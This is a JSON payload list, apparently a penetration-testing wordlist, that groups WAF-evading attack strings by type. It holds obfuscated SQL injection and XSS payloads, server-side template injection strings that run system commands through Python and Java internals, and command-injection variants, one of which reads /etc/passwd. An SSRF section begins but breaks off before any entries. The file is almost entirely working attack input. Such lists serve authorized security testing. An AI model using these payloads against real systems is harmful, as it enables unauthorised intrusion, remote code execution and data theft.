{
  "category": "waf_bypass",
  "contexts": {
    "sqli_bypass": {
      "description": "SQL injection payloads that bypass common WAF rules (Cloudflare, AWS WAF, ModSecurity)",
      "payloads": [
        "' /*!50000OR*/ 1=1--",
        "' %0aOR%0a1=1--",
        "' OR 1=1#",
        "'+/*!50000union*/+/*!50000select*/+1,2,3--",
        "' UNION%0aSELECT%0a1,2,3--",
        "' UnIoN SeLeCt 1,2,3--",
        "' OR '1'='1'/*",
        "';%0aselect%0a1;--",
        "' and 1=(select 1)--",
        "' WITH t AS (SELECT 1) SELECT * FROM t--",
        "0'XOR(if(1=1,sleep(5),0))XOR'Z",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND 1=CONVERT(int,@@VERSION)--"
      ]
    },
    "xss_bypass": {
      "description": "XSS payloads bypassing sanitization and WAF filters",
      "payloads": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "javascript:alert(1)//",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><img src=x onerror=alert`1`>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<input onfocus=alert(1) autofocus>"
      ]
    },
    "ssti_bypass": {
      "description": "SSTI payloads bypassing template syntax filters",
      "payloads": [
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%set a='__cla'+'ss__'%}{{''[a]}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "<%= system('id') %>",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{% debug %}",
        "{{lipsum.__globals__.os.popen('id').read()}}"
      ]
    },
    "cmdi_bypass": {
      "description": "Command injection payloads bypassing filters",
      "payloads": [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        "%0aid",
        "||id",
        "&&id",
        ";{id}",
        "$IFS$9id",
        "i]d",
        "/???/??t /???/p??s??",
        "cat$IFS/etc$IFS/passwd"
      ]
    },
    "ssrf_bypass": {
      "description": "SSRF payloads bypassing URL validation and allowlists",
      "payloads": [
